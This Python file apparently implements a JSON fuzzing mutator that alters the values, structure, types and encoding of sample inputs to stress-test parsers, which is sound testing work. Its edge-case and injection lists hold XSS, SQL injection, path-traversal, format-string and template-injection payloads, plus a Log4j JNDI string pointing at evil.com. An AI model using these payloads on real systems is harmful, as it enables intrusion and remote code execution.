import json
import random
from typing import Any, Dict, List, Union

from .base import BaseMutator
from models import InputFormat


class JSONMutator(BaseMutator):
    """
    JSON-specific mutator that maintains JSON structure while applying mutations.
    """

    def __init__(self, sample_data: bytes):
        """
        Initialize JSON mutator with sample data.

        Args:
            sample_data: Original JSON data as bytes
        """
        super().__init__(sample_data, InputFormat.JSON)
        self._parsed_json = None
        self._parse_json_structure()

    def _parse_json_structure(self) -> None:
        """Parse the JSON structure."""
        try:
            content = self.original_data.decode('utf-8', errors='ignore')
            self._parsed_json = json.loads(content)
        except json.JSONDecodeError:
            # If JSON is malformed, try to fix it or create a simple structure
            self._parsed_json = {"message": "fallback_json"}

    def mutate(self) -> bytes:
        """
        Generate a mutated JSON by applying various mutation strategies.

        Returns:
            Mutated JSON data as bytes
        """
        mutation_type = self.random.choice([
            'value_mutation',
            'structure_mutation',
            'type_mutation',
            'size_mutation',
            'encoding_mutation',
            'malformed_json'
        ])

        result = None

        if mutation_type == 'value_mutation':
            result = self._mutate_values()
        elif mutation_type == 'structure_mutation':
            result = self._mutate_structure()
        elif mutation_type == 'type_mutation':
            result = self._mutate_types()
        elif mutation_type == 'size_mutation':
            result = self._mutate_size()
        elif mutation_type == 'encoding_mutation':
            result = self._mutate_encoding()
        else:  # malformed_json
            result = self._create_malformed_json()

        # Ensure minimum size to prevent issues with strategies
        if result and len(result) < 2:
            # If result is too small, return original data
            return self.original_data

        return result

    def _mutate_values(self) -> bytes:
        """Mutate individual values within the JSON."""
        if not self._parsed_json:
            return self.original_data

        mutated_json = self._deep_copy_json(self._parsed_json)
        self._mutate_values_recursive(mutated_json, max_depth=5)

        return self._serialize_json(mutated_json)

    def _mutate_values_recursive(self, obj: Any, depth: int = 0, max_depth: int = 5) -> None:
        """Recursively mutate values in JSON structure."""
        if depth >= max_depth:
            return

        if isinstance(obj, dict):
            # Mutate a random subset of values
            keys = list(obj.keys())
            self.random.shuffle(keys)
            max_mutate = max(1, min(3, len(keys)))
            num_to_mutate = self.random.randint(1, max_mutate)

            for key in keys[:num_to_mutate]:
                if isinstance(obj[key], (dict, list)):
                    self._mutate_values_recursive(obj[key], depth + 1, max_depth)
                else:
                    obj[key] = self._get_mutated_value(obj[key])

        elif isinstance(obj, list):
            # Mutate a random subset of list items
            if obj:
                num_to_mutate = self.random.randint(1, min(3, len(obj)))
                indices = self.random.sample(range(len(obj)), num_to_mutate)

                for idx in indices:
                    if isinstance(obj[idx], (dict, list)):
                        self._mutate_values_recursive(obj[idx], depth + 1, max_depth)
                    else:
                        obj[idx] = self._get_mutated_value(obj[idx])

    def _mutate_structure(self) -> bytes:
        """Mutate the overall JSON structure."""
        if not self._parsed_json:
            return self.original_data

        mutation_strategy = self.random.choice([
            'add_nested_object',
            'duplicate_keys',
            'remove_fields',
            'reorder_arrays',
            'nest_arrays'
        ])

        if mutation_strategy == 'add_nested_object':
            return self._add_nested_objects()
        elif mutation_strategy == 'duplicate_keys':
            return self._duplicate_keys()
        elif mutation_strategy == 'remove_fields':
            return self._remove_fields()
        elif mutation_strategy == 'reorder_arrays':
            return self._reorder_arrays()
        else:  # nest_arrays
            return self._nest_arrays()

    def _mutate_types(self) -> bytes:
        """Mutate data types within the JSON."""
        if not self._parsed_json:
            return self.original_data

        mutated_json = self._deep_copy_json(self._parsed_json)
        self._mutate_types_recursive(mutated_json)

        return self._serialize_json(mutated_json)

    def _mutate_types_recursive(self, obj: Any) -> None:
        """Recursively mutate data types."""
        if isinstance(obj, dict):
            for key in list(obj.keys()):
                if self.random.random() < 0.3:  # 30% chance to mutate type
                    obj[key] = self._get_type_mutation(obj[key])
                elif isinstance(obj[key], (dict, list)):
                    self._mutate_types_recursive(obj[key])

        elif isinstance(obj, list):
            for i in range(len(obj)):
                if self.random.random() < 0.3:  # 30% chance to mutate type
                    obj[i] = self._get_type_mutation(obj[i])
                elif isinstance(obj[i], (dict, list)):
                    self._mutate_types_recursive(obj[i])

    def _mutate_size(self) -> bytes:
        """Mutate the size of JSON structures."""
        if not self._parsed_json:
            return self.original_data

        mutation_strategy = self.random.choice([
            'expand_structure',
            'shrink_structure',
            'deep_nesting',
            'wide_structure'
        ])

        if mutation_strategy == 'expand_structure':
            return self._expand_structure()
        elif mutation_strategy == 'shrink_structure':
            return self._shrink_structure()
        elif mutation_strategy == 'deep_nesting':
            return self._create_deep_nesting()
        else:  # wide_structure
            return self._create_wide_structure()

    def _mutate_encoding(self) -> bytes:
        """Apply encoding-related mutations."""
        if not self._parsed_json:
            return self.original_data

        # Get regular JSON string first
        regular_json = self._serialize_json(self._parsed_json).decode('utf-8')

        encoding_mutations = [
            lambda x: x.replace(' ', '  '),  # Extra spaces
            lambda x: x.replace('\n', '\n\n'),  # Extra newlines
            lambda x: x.replace('"', "'"),  # Change quote type
            lambda x: x.replace(',', ', '),  # Space after commas
            lambda x: x.replace(':', ': '),  # Space after colons
            lambda x: '\x00' + x,  # Null byte at start
            lambda x: x + '\x00' * 10,  # Null bytes at end
            lambda x: x + ' ' * 100,  # Extra spaces at end
        ]

        mutated_content = self.random.choice(encoding_mutations)(regular_json)
        return mutated_content.encode('utf-8', errors='ignore')

    def _create_malformed_json(self) -> bytes:
        """Create intentionally malformed JSON."""
        if not self._parsed_json:
            return self.original_data

        regular_json = self._serialize_json(self._parsed_json).decode('utf-8')

        malformations = [
            # Unclosed brackets/braces
            lambda x: x.rstrip(']})'),
            # Extra commas
            lambda x: x.replace(']', ',]'),
            lambda x: x.replace('}', ',}'),
            # Missing commas
            lambda x: x.replace(', ', ' '),
            # Mismatched brackets
            lambda x: x.replace('{', '[') if x.count('{') > x.count('[') else x,
            # Invalid escape sequences
            lambda x: x.replace('\\n', '\\x'),
            # Control characters
            lambda x: x.replace('"', '"\x01"'),
            # Unicode issues
            lambda x: x.replace('u', 'ü'),
        ]

        malformed_content = self.random.choice(malformations)(regular_json)
        return malformed_content.encode('utf-8', errors='ignore')

    def _get_mutated_value(self, original_value: Any) -> Any:
        """Get a mutated version of a value."""
        if isinstance(original_value, str):
            return self._get_mutated_string(original_value)
        elif isinstance(original_value, (int, float)):
            return self._get_mutated_number(original_value)
        elif isinstance(original_value, bool):
            return not original_value
        elif original_value is None:
            return self.random.choice([0, "", False, [], {}])
        else:
            return self._get_random_value()

    def _get_mutated_string(self, original: str) -> str:
        """Get a mutated string value."""
        mutation_type = self.random.choice([
            'edge_cases',
            'buffer_overflow',
            'format_injection',
            'unicode_mutation',
            'empty_value'
        ])

        if mutation_type == 'edge_cases':
            return self._get_string_edge_case()
        elif mutation_type == 'buffer_overflow':
            return 'A' * self.random.randint(100, 1000)
        elif mutation_type == 'format_injection':
            return self._get_format_injection()
        elif mutation_type == 'unicode_mutation':
            return self._get_unicode_mutation()
        else:  # empty_value
            return ''

    def _get_mutated_number(self, original: Union[int, float]) -> Union[int, float]:
        """Get a mutated number value."""
        mutation_type = self.random.choice([
            'edge_cases',
            'arithmetic_ops',
            'float_mutation',
            'infinity_mutation'
        ])

        if mutation_type == 'edge_cases':
            return self._get_numeric_edge_case()
        elif mutation_type == 'arithmetic_ops':
            operations = [
                lambda x: x + 1,
                lambda x: x - 1,
                lambda x: x * 2,
                lambda x: x // 2 if isinstance(x, int) else x / 2,
                lambda x: x * -1,
                lambda x: 0,
            ]
            return self.random.choice(operations)(original)
        elif mutation_type == 'float_mutation':
            return float(self.random.randint(-1000000, 1000000)) / 1000.0
        else:  # infinity_mutation
            return self.random.choice([float('inf'), float('-inf'), float('nan')])

    def _get_type_mutation(self, original_value: Any) -> Any:
        """Get a value with a different type."""
        current_type = type(original_value)

        # Available types excluding the current one
        available_types = [str, int, float, bool, list, dict, type(None)]
        available_types = [t for t in available_types if t != current_type]

        if not available_types:
            return original_value

        new_type = self.random.choice(available_types)

        if new_type == str:
            return self._get_string_edge_case()
        elif new_type == int:
            return self.random.randint(-1000000, 1000000)
        elif new_type == float:
            return self.random.uniform(-1000000, 1000000)
        elif new_type == bool:
            return self.random.choice([True, False])
        elif new_type == list:
            return [self._get_random_value() for _ in range(self.random.randint(1, 5))]
        elif new_type == dict:
            return {f"key_{i}": self._get_random_value() for i in range(self.random.randint(1, 3))}
        else:  # None
            return None

    def _add_nested_objects(self) -> bytes:
        """Add nested objects to the JSON structure."""
        if not self._parsed_json:
            return self.original_data

        mutated_json = self._deep_copy_json(self._parsed_json)
        self._add_nested_objects_recursive(mutated_json)

        return self._serialize_json(mutated_json)

    def _add_nested_objects_recursive(self, obj: Any) -> None:
        """Recursively add nested objects."""
        if isinstance(obj, dict):
            # Add a nested object with random probability
            if self.random.random() < 0.3:
                new_key = f"nested_{self.random.randint(1000, 9999)}"
                obj[new_key] = {
                    "nested_value": self._get_random_value(),
                    "deep_nested": {"deep_key": self._get_random_value()}
                }

            # Recurse into existing values
            for value in obj.values():
                if isinstance(value, (dict, list)):
                    self._add_nested_objects_recursive(value)

        elif isinstance(obj, list):
            # Add nested objects to list
            if self.random.random() < 0.3:
                obj.append({
                    "list_nested": self._get_random_value(),
                    "array_nested": [self._get_random_value() for _ in range(3)]
                })

            # Recurse into list items
            for item in obj:
                if isinstance(item, (dict, list)):
                    self._add_nested_objects_recursive(item)

    def _duplicate_keys(self) -> bytes:
        """Create JSON with duplicate keys (last one wins)."""
        if not self._parsed_json or not isinstance(self._parsed_json, dict):
            return self.original_data

        # Create JSON string manually to allow duplicate keys
        json_str = "{"
        for key, value in self._parsed_json.items():
            json_str += f'"{key}": {json.dumps(value)}, '
            if self.random.random() < 0.3:  # 30% chance to duplicate this key
                json_str += f'"{key}": {json.dumps(self._get_random_value())}, '

        json_str = json_str.rstrip(', ') + "}"
        return json_str.encode('utf-8')

    def _remove_fields(self) -> bytes:
        """Remove random fields from the JSON."""
        if not self._parsed_json:
            return self.original_data

        mutated_json = self._deep_copy_json(self._parsed_json)
        self._remove_fields_recursive(mutated_json)

        return self._serialize_json(mutated_json)

    def _remove_fields_recursive(self, obj: Any) -> None:
        """Recursively remove fields."""
        if isinstance(obj, dict):
            keys = list(obj.keys())
            # Remove 30-70% of keys
            num_to_remove = self.random.randint(
                int(len(keys) * 0.3), int(len(keys) * 0.7)
            )
            keys_to_remove = self.random.sample(keys, num_to_remove)

            for key in keys_to_remove:
                del obj[key]

            # Recurse into remaining values
            for value in obj.values():
                if isinstance(value, (dict, list)):
                    self._remove_fields_recursive(value)

        elif isinstance(obj, list):
            # Remove 30-70% of list items
            if obj:
                num_to_remove = self.random.randint(
                    int(len(obj) * 0.3), int(len(obj) * 0.7)
                )
                indices_to_remove = self.random.sample(range(len(obj)), num_to_remove)
                for idx in sorted(indices_to_remove, reverse=True):
                    del obj[idx]

            # Recurse into remaining items
            for item in obj:
                if isinstance(item, (dict, list)):
                    self._remove_fields_recursive(item)

    def _reorder_arrays(self) -> bytes:
        """Randomly reorder arrays in the JSON."""
        if not self._parsed_json:
            return self.original_data

        mutated_json = self._deep_copy_json(self._parsed_json)
        self._reorder_arrays_recursive(mutated_json)

        return self._serialize_json(mutated_json)

    def _reorder_arrays_recursive(self, obj: Any) -> None:
        """Recursively reorder arrays."""
        if isinstance(obj, dict):
            for value in obj.values():
                if isinstance(value, (dict, list)):
                    self._reorder_arrays_recursive(value)

        elif isinstance(obj, list):
            self.random.shuffle(obj)
            for item in obj:
                if isinstance(item, (dict, list)):
                    self._reorder_arrays_recursive(item)

    def _nest_arrays(self) -> bytes:
        """Create nested array structures."""
        if not self._parsed_json:
            return self.original_data

        mutated_json = self._deep_copy_json(self._parsed_json)
        self._nest_arrays_recursive(mutated_json)

        return self._serialize_json(mutated_json)

    def _nest_arrays_recursive(self, obj: Any) -> None:
        """Recursively create nested arrays."""
        if isinstance(obj, dict):
            for value in obj.values():
                if isinstance(value, (dict, list)):
                    self._nest_arrays_recursive(value)

        elif isinstance(obj, list):
            if self.random.random() < 0.3:
                # Wrap the array in another array
                nested_array = [obj]
                obj.clear()
                obj.extend(nested_array)
            else:
                for item in obj:
                    if isinstance(item, (dict, list)):
                        self._nest_arrays_recursive(item)

    def _expand_structure(self) -> bytes:
        """Expand the JSON structure with more data."""
        if not self._parsed_json:
            return self.original_data

        mutated_json = self._deep_copy_json(self._parsed_json)

        # Add more fields to all objects
        self._expand_structure_recursive(mutated_json)

        return self._serialize_json(mutated_json)

    def _expand_structure_recursive(self, obj: Any) -> None:
        """Recursively expand the structure."""
        if isinstance(obj, dict):
            # Add 3-10 new fields
            num_to_add = self.random.randint(3, 10)
            for i in range(num_to_add):
                obj[f"expanded_{i}"] = self._get_random_value()

            for value in obj.values():
                if isinstance(value, (dict, list)):
                    self._expand_structure_recursive(value)

        elif isinstance(obj, list):
            # Add 3-10 new items
            num_to_add = self.random.randint(3, 10)
            for _ in range(num_to_add):
                obj.append(self._get_random_value())

            for item in obj:
                if isinstance(item, (dict, list)):
                    self._expand_structure_recursive(item)

    def _shrink_structure(self) -> bytes:
        """Shrink the JSON structure."""
        if not self._parsed_json:
            return self.original_data

        mutated_json = self._deep_copy_json(self._parsed_json)

        # Keep only a small portion
        if isinstance(mutated_json, dict):
            keys = list(mutated_json.keys())
            keep_count = max(1, len(keys) // 4)
            keys_to_keep = self.random.sample(keys, keep_count)

            new_dict = {}
            for key in keys_to_keep:
                new_dict[key] = mutated_json[key]
                # Recursively shrink nested structures
                if isinstance(new_dict[key], (dict, list)):
                    self._shrink_structure_recursive(new_dict[key])

            mutated_json = new_dict

        elif isinstance(mutated_json, list):
            keep_count = max(1, len(mutated_json) // 4)
            indices_to_keep = self.random.sample(range(len(mutated_json)), keep_count)

            new_list = []
            for idx in indices_to_keep:
                new_list.append(mutated_json[idx])
                # Recursively shrink nested structures
                if isinstance(new_list[-1], (dict, list)):
                    self._shrink_structure_recursive(new_list[-1])

            mutated_json = new_list

        return self._serialize_json(mutated_json)

    def _shrink_structure_recursive(self, obj: Any) -> None:
        """Recursively shrink nested structures."""
        if isinstance(obj, dict):
            keys = list(obj.keys())
            if len(keys) > 1:
                keep_count = max(1, len(keys) // 2)
                keys_to_keep = self.random.sample(keys, keep_count)

                new_dict = {}
                for key in keys_to_keep:
                    new_dict[key] = obj[key]
                    if isinstance(new_dict[key], (dict, list)):
                        self._shrink_structure_recursive(new_dict[key])

                obj.clear()
                obj.update(new_dict)

        elif isinstance(obj, list):
            if len(obj) > 1:
                keep_count = max(1, len(obj) // 2)
                indices_to_keep = self.random.sample(range(len(obj)), keep_count)

                new_list = [obj[i] for i in indices_to_keep]
                for item in new_list:
                    if isinstance(item, (dict, list)):
                        self._shrink_structure_recursive(item)

                obj.clear()
                obj.extend(new_list)

    def _create_deep_nesting(self) -> bytes:
        """Create deeply nested JSON structures."""
        if not self._parsed_json:
            return self.original_data

        # Create a deeply nested structure
        nested = self._get_random_value()
        depth = self.random.randint(10, 50)

        for i in range(depth):
            if self.random.random() < 0.5:
                nested = {"level": i, "nested": nested}
            else:
                nested = [nested, {"level": i}]

        mutated_json = {"original": self._parsed_json, "deep_nested": nested}
        return self._serialize_json(mutated_json)

    def _create_wide_structure(self) -> bytes:
        """Create JSON with many fields at the same level."""
        if not self._parsed_json:
            return self.original_data

        # Create a wide structure with many fields
        wide_obj = {}
        num_fields = self.random.randint(100, 1000)

        for i in range(num_fields):
            if self.random.random() < 0.7:
                wide_obj[f"field_{i}"] = self._get_random_value()
            else:
                wide_obj[f"field_{i}"] = {"nested": self._get_random_value()}

        mutated_json = {"original": self._parsed_json, "wide": wide_obj}
        return self._serialize_json(mutated_json)

    def _get_random_value(self) -> Any:
        """Get a random value of any supported type."""
        value_type = self.random.choice([str, int, float, bool, list, dict, type(None)])

        if value_type == str:
            return self._get_string_edge_case()
        elif value_type == int:
            return self.random.randint(-1000000, 1000000)
        elif value_type == float:
            return self.random.uniform(-1000000, 1000000)
        elif value_type == bool:
            return self.random.choice([True, False])
        elif value_type == list:
            return [self._get_random_value() for _ in range(self.random.randint(1, 3))]
        elif value_type == dict:
            return {f"key_{i}": self._get_random_value() for i in range(self.random.randint(1, 2))}
        else:  # None
            return None

    def _get_string_edge_case(self) -> str:
        """Get a string edge case value."""
        edge_cases = [
            '',  # Empty string
            ' ',  # Single space
            '\t',  # Tab
            '\n',  # Newline
            '\r',  # Carriage return
            '\0',  # Null character
            'NULL',  # SQL NULL
            'null',  # JSON null
            'undefined',  # JavaScript undefined
            'true', 'false',  # Boolean strings
            '0', '-1', '2147483647',  # Numeric strings
            '🚀🔥💯',  # Unicode emojis
            'café',  # Accented characters
            '<script>alert("xss")</script>',  # XSS
            '../../../etc/passwd',  # Path traversal
        ]
        return self.random.choice(edge_cases)

    def _get_numeric_edge_case(self) -> Union[int, float]:
        """Get a numeric edge case value."""
        edge_cases = [
            0, -1, 1, 2147483647, -2147483648,  # 32-bit bounds
            4294967295, 4294967296,  # 32-bit unsigned
            9223372036854775807, -9223372036854775808,  # 64-bit bounds
            3.14159, -3.14159, 0.0, -0.0,  # Floats
            float('inf'), float('-inf'), float('nan'),  # Special floats
            999999999999999999999,  # Very large
        ]
        return self.random.choice(edge_cases)

    def _get_format_injection(self) -> str:
        """Get a format injection string."""
        injections = [
            '%s%s%s%s',  # Format string
            '%x%x%x%x',  # Hex format
            '%n%n%n%n',  # Write format
            '../../../etc/passwd',  # Path traversal
            '<script>alert("xss")</script>',  # XSS
            "' OR '1'='1",  # SQL injection
            '{{7*7}}',  # Template injection
            '${jndi:ldap://evil.com/a}',  # Log4j
        ]
        return self.random.choice(injections)

    def _get_unicode_mutation(self) -> str:
        """Get a Unicode mutation string."""
        unicode_strings = [
            '🚀🔥💯🎯',  # Emojis
            'café résumé naïve',  # Accented characters
            'привет мир',  # Cyrillic
            'こんにちは世界',  # Japanese
            'العربية',  # Arabic
            'עברית',  # Hebrew
            '👨‍💻👩‍💻',  # ZWJ sequences
            '\u202E\u202D\u202A',  # Directional markers
            '\uFEFF\u200B\u200C\u200D',  # Zero-width characters
        ]
        return self.random.choice(unicode_strings)

    def _deep_copy_json(self, obj: Any) -> Any:
        """Create a deep copy of JSON data."""
        return json.loads(json.dumps(obj))

    def _serialize_json(self, obj: Any) -> bytes:
        """Serialize JSON data to bytes."""
        try:
            return json.dumps(obj, ensure_ascii=False).encode('utf-8')
        except (TypeError, ValueError):
            # Fallback to string representation
            return str(obj).encode('utf-8')

    def reset(self) -> None:
        """Reset the mutator to its original state."""
        self.current_data = self.original_data
        self.mutation_count = 0
        self._parse_json_structure()

    def _validate_structure(self, data: bytes) -> bool:
        """Validate that data is still valid JSON."""
        try:
            json.loads(data.decode('utf-8'))
            return True
        except:
            return False

    def generate_mutation_description(self) -> str:
        """Generate a description of the last mutation."""
        if not self._parsed_json:
            return f"JSON mutation #{self.mutation_count} (no structure detected)"

        json_type = type(self._parsed_json).__name__
        if isinstance(self._parsed_json, dict):
            size = len(self._parsed_json)
            return f"JSON mutation #{self.mutation_count} (dict with {size} keys)"
        elif isinstance(self._parsed_json, list):
            size = len(self._parsed_json)
            return f"JSON mutation #{self.mutation_count} (list with {size} items)"
        else:
            return f"JSON mutation #{self.mutation_count} ({json_type} value)"

    def _increment_mutation_count(self) -> None:
        """Increment the mutation counter."""
        super()._increment_mutation_count()